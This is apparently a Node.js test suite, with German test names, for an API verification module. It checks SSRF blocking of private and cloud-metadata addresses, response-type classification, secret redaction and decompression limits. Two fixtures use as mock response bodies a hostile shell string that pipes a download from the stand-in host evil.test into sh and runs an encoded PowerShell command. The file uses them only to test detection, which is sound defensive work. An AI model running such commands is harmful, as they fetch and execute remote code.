import assert from "node:assert/strict";
import { test } from "node:test";
import {
  calculateSecurityConfidence,
  decodeResponseBody,
  runLiveVerification,
  validatePublicUrl,
  validateRedirectTarget,
} from "../artifacts/api-server/src/lib/api-verifier.ts";

const goodTls = {
  status: "CHECKED",
  expiresAt: new Date("2027-09-13T00:00:00.000Z"),
  daysRemaining: 365,
  protocol: "TLSv1.3",
  certificateValid: true,
};

function fakeFetcher(body, headers = { "content-type": "application/json" }, overrides = {}) {
  return async () => ({
    body,
    status: 200,
    elapsedMs: 120,
    headers,
    location: undefined,
    tls: goodTls,
    redirects: { count: 0, crossOrigin: false, downgraded: false },
    ...overrides,
  });
}

test("SSRF-Schutz blockiert Loopback- und private Ziele", async () => {
  await assert.rejects(
    () => validatePublicUrl("http://127.0.0.1:8080/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
  await assert.rejects(
    () => validatePublicUrl("http://localhost/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
  await assert.rejects(
    () => validatePublicUrl("http://[::1]/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
  await assert.rejects(
    () => validatePublicUrl("http://[::ffff:127.0.0.1]/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
  await assert.rejects(
    () => validatePublicUrl("http://[fc00::1]/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
});

test("Redirects auf interne Ziele werden vor dem Request blockiert", async () => {
  await assert.rejects(
    () =>
      validateRedirectTarget(
        new URL("https://public.example/"),
        "http://169.254.169.254/latest/meta-data",
        "https://public.example",
        false,
      ),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
});

test("Normales JSON wird als API-Antwort erkannt", async () => {
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "JSON",
    fakeFetcher('{"ok":true}'),
  );

  assert.equal(result.status, "PASS");
  assert.equal(result.securitySignals.responseType.kind, "JSON");
  assert.equal(result.securitySignals.responseType.status, "PASS");
  assert.equal(result.securitySignals.suspiciousPayload.status, "PASS");
  assert.equal(result.securitySignals.threatIndicators.status, "NONE_DETECTED");
  assert.equal(result.securitySignals.redirects.status, "PASS");
  assert.ok(result.securityObservation?.responseFingerprint);
  assert.equal(result.securityObservation?.redirectTargets.length, 0);
});

test("HTML-Antwort wird als Warnung klassifiziert und nicht ausgeführt", async () => {
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("<!doctype html><script>alert(1)</script>", { "content-type": "text/html" }),
  );

  assert.equal(result.status, "PASS");
  assert.equal(result.securitySignals.responseType.kind, "HTML");
  assert.equal(result.securitySignals.responseType.status, "WARNING");
  assert.match(result.securitySignals.suspiciousPayload.status, /PASS|WARNING/);
});

test("Binärantwort und Download werden nicht geöffnet", async () => {
  const result = await runLiveVerification(
    "https://service.example/file",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("\u0000MZ\u0000", { "content-type": "application/octet-stream" }),
  );

  assert.equal(result.securitySignals.responseType.kind, "BINARY");
  assert.equal(result.securitySignals.responseType.status, "WARNING");
  assert.match(result.securitySignals.responseType.summary, /nicht geöffnet|Datenstrom/);
});

test("Verdächtige Script- und Shell-Muster bleiben Warnsignale", async () => {
  const result = await runLiveVerification(
    "https://service.example/payload",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("powershell.exe -enc AAAA; eval(foo); curl https://evil.test/x | sh", {
      "content-type": "text/plain",
    }),
  );

  assert.equal(result.securitySignals.suspiciousPayload.status, "WARNING");
  assert.ok(result.securitySignals.suspiciousPayload.indicators.length >= 2);
  assert.equal(result.securitySignals.threatIndicators.status, "SUSPICIOUS");
  assert.match(result.securitySignals.suspiciousPayload.summary, /kein Code ausgeführt/i);
});

test("Kombinierte ausführbare und Shell-Muster werden blockiert und hart gedeckelt", async () => {
  const result = await runLiveVerification(
    "https://service.example/payload",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("MZ\x00 powershell.exe -enc AAAA; curl https://evil.test/x | sh", {
      "content-type": "application/octet-stream",
    }),
  );

  assert.equal(result.securitySignals.threatIndicators.status, "FLAGGED");
  assert.equal(result.securitySignals.threatIndicators.severity, "CRITICAL");
  assert.equal(result.securitySignals.securityConfidence.score, 20);
  assert.equal(result.securitySignals.securityConfidence.status, "FAIL");
});

test("TLS- und Header-Warnungen bleiben separat sichtbar", async () => {
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher('{"ok":true}', { "content-type": "application/json" }, {
      tls: {
        status: "WARNING",
        expiresAt: null,
        daysRemaining: null,
        protocol: "TLSv1.2",
        certificateValid: false,
      },
    }),
  );

  assert.equal(result.securitySignals.transport.status, "WARNING");
  assert.equal(result.securitySignals.securityHeaders.status, "WARNING");
  assert.equal(result.securitySignals.reputation.status, "UNKNOWN");
});

test("Security Confidence wird bei wenigen Samples und unbekannter Reputation gedeckelt", () => {
  const signals = {
    transport: { status: "PASS" },
    network: { status: "PASS" },
    redirects: { status: "PASS" },
    responseType: { status: "PASS" },
    suspiciousPayload: { status: "PASS" },
    securityHeaders: { status: "PASS" },
    reputation: { status: "UNKNOWN" },
  };
  const confidence = calculateSecurityConfidence(signals, 1);

  assert.equal(confidence.score, 60);
  assert.equal(confidence.status, "WARNING");
  assert.match(confidence.summary, /keine Sicherheitsgarantie/i);
});

test("Antwortinhalte und Secrets gelangen nicht in das Prüfergebnis", async () => {
  const secret = "TOP_SECRET_SHOULD_NOT_LEAK";
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "JSON",
    fakeFetcher(JSON.stringify({ token: secret })),
  );

  assert.doesNotMatch(JSON.stringify(result), new RegExp(secret));
  assert.doesNotMatch(JSON.stringify(result.securityObservation), new RegExp(secret));
});

test("Ungültiges JSON, falscher Content-Type und Base64-Muster bleiben getrennte Warnsignale", async () => {
  const invalidJson = await runLiveVerification(
    "https://service.example/data",
    "status",
    1000,
    {},
    "JSON",
    fakeFetcher("{broken", { "content-type": "application/json" }),
  );
  assert.equal(invalidJson.errorCode, "INVALID_JSON");
  assert.equal(invalidJson.securitySignals.responseType.kind, "JSON");

  const wrongContentType = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher('{"status":"ok"}', { "content-type": "application/octet-stream" }),
  );
  assert.equal(wrongContentType.securitySignals.responseType.kind, "BINARY");
  assert.equal(wrongContentType.securitySignals.responseType.status, "WARNING");

  const base64Like = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher(`{"preview":"${"A".repeat(128)}"}`, { "content-type": "application/json" }),
  );
  assert.equal(base64Like.securitySignals.suspiciousPayload.status, "PASS");
});

test("Auth- und Rate-Limit-Antworten werden nicht als Malware bewertet", async () => {
  for (const status of [401, 403, 429, 500]) {
    const result = await runLiveVerification(
      "https://service.example/data",
      "",
      1000,
      {},
      "HTTP",
      fakeFetcher("", {
        "content-type": "application/json",
        ...(status === 401 ? { "www-authenticate": "Bearer" } : {}),
        ...(status === 429 ? { "retry-after": "30" } : {}),
      }, { status }),
    );

    assert.equal(result.status, "FAIL");
    assert.equal(result.httpStatus, status);
    assert.equal(result.securitySignals.threatIndicators.status, "NONE_DETECTED");
    assert.equal(result.securitySignals.suspiciousPayload.status, "PASS");
    if (status === 401 || status === 403) {
      assert.equal(result.securitySignals.authentication.required, true);
    }
    if (status === 429) {
      assert.equal(result.securitySignals.rateLimit.detected, true);
      assert.equal(result.securitySignals.rateLimit.retryAfterSeconds, 30);
    }
  }
});

test("Timeout und Redirect-Loop bleiben sichere Verbindungsfehler", async () => {
  const timeout = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    async () => {
      throw Object.assign(new Error("timeout"), { code: "TIMEOUT" });
    },
  );
  assert.equal(timeout.reachable, false);
  assert.equal(timeout.errorCode, "TIMEOUT");
  assert.equal(timeout.securitySignals.threatIndicators.status, "UNKNOWN");

  const redirectLoop = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    async () => {
      throw Object.assign(new Error("redirect loop"), { code: "TOO_MANY_REDIRECTS" });
    },
  );
  assert.equal(redirectLoop.reachable, false);
  assert.equal(redirectLoop.errorCode, "TOO_MANY_REDIRECTS");
  assert.equal(redirectLoop.securitySignals.network.status, "UNKNOWN");
});

test("Unterstützte Kompression wird vor der Inhaltsanalyse sicher entpackt", async () => {
  const { gzipSync, brotliCompressSync, deflateSync } = await import("node:zlib");
  const payload = Buffer.from('{"ok":true}', "utf8");
  for (const [encoding, compressed] of [
    ["gzip", gzipSync(payload)],
    ["br", brotliCompressSync(payload)],
    ["deflate", deflateSync(payload)],
  ]) {
    assert.equal(
      await decodeResponseBody(compressed, { "content-encoding": encoding }),
      '{"ok":true}',
    );
  }
});

test("Unbekannte oder mehrfach verkettete Kompression wird nicht analysiert", async () => {
  await assert.rejects(
    () => decodeResponseBody(Buffer.from("payload"), { "content-encoding": "compress" }),
    (error) => error?.code === "UNSUPPORTED_COMPRESSION",
  );
  await assert.rejects(
    () => decodeResponseBody(Buffer.from("payload"), { "content-encoding": "gzip, br" }),
    (error) => error?.code === "UNSUPPORTED_COMPRESSION",
  );
});

test("Komprimierte Antworten über dem entpackten Größenlimit werden abgelehnt", async () => {
  const { gzipSync } = await import("node:zlib");
  const oversizedPayload = Buffer.alloc(1_000_001, "x");

  await assert.rejects(
    () => decodeResponseBody(gzipSync(oversizedPayload), { "content-encoding": "gzip" }),
    (error) => error?.code === "RESPONSE_TOO_LARGE",
  );
});